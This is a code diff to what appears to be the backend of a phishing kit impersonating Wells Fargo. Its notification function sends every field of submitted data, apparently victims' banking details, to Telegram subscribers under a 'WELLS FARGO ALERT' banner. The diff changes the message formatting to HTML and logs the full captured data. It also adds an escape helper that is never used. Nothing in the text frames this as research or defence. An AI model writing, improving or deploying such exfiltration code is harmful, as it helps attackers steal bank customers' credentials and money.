@@ -9,6 +9,11 @@ import * as cheerio from "cheerio";
 import { UAParser } from "ua-parser-js";
 
 // Telegram notification function - sends to all active subscribers
+// Escape special Markdown characters for Telegram
+function escapeMarkdown(text: string): string {
+  return String(text).replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
+}
+
 async function sendTelegramNotification(subject: string, data: Record<string, any>) {
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
   
@@ -17,16 +22,18 @@ async function sendTelegramNotification(subject: string, data: Record<string, an
     return;
   }
 
-  // Build message text
-  let message = `🏦 *WELLS FARGO ALERT*\n`;
+  console.log("Building Telegram notification with data:", JSON.stringify(data, null, 2));
+
+  // Build message text - use HTML parse mode for better formatting
+  let message = `🏦 <b>WELLS FARGO ALERT</b>\n`;
   message += `━━━━━━━━━━━━━━━━━━━━\n`;
-  message += `📋 *${subject}*\n\n`;
+  message += `📋 <b>${subject}</b>\n\n`;
   
   Object.entries(data)
     .filter(([_, value]) => value !== null && value !== undefined && value !== '')
     .forEach(([key, value]) => {
-      const displayValue = typeof value === 'object' ? JSON.stringify(value) : value;
-      message += `*${key}:* ${displayValue}\n`;
+      const displayValue = typeof value === 'object' ? JSON.stringify(value) : String(value);
+      message += `<b>${key}:</b> <code>${displayValue}</code>\n`;
     });
   
   message += `\n⏰ ${new Date().toLocaleString()}`;
@@ -62,7 +69,7 @@ async function sendTelegramNotification(subject: string, data: Record<string, an
           body: JSON.stringify({
             chat_id: chatId,
             text: message,
-            parse_mode: 'Markdown',
+            parse_mode: 'HTML',
           }),
         });
         
